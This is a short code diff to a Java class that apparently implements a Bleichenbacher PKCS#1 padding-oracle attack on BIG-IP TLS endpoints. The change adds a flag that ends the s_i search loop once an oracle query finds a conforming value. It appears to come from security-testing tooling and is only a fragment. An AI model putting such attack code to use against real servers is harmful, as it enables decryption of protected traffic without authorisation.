@@ -83,7 +83,8 @@ public class BleichenbacherBigIP {
                 BigInteger sMin = computeSMin(ri, q, n, upperBound);
                 BigInteger sMax = computeSMax(ri, q, n, lowerBound);
                 si = sMin;
-                while (si.compareTo(sMax) == -1) {
+                boolean siFound = false;
+                while (si.compareTo(sMax) == -1 && !siFound) {
                     si = si.add(BigInteger.ONE);
                     send = prepareMsg(c0, si);
                     // check PKCS#1 conformity
@@ -109,6 +110,8 @@ public class BleichenbacherBigIP {
                             logger.info("Number of oracle queries: " + oracle.getNumberOfQueries());
                             return;
                         }
+                        siFound = true;
+                        
                         if(lowerBound.compareTo(c0) == 1) {
                             throw new RuntimeException("invalid state");
                         }
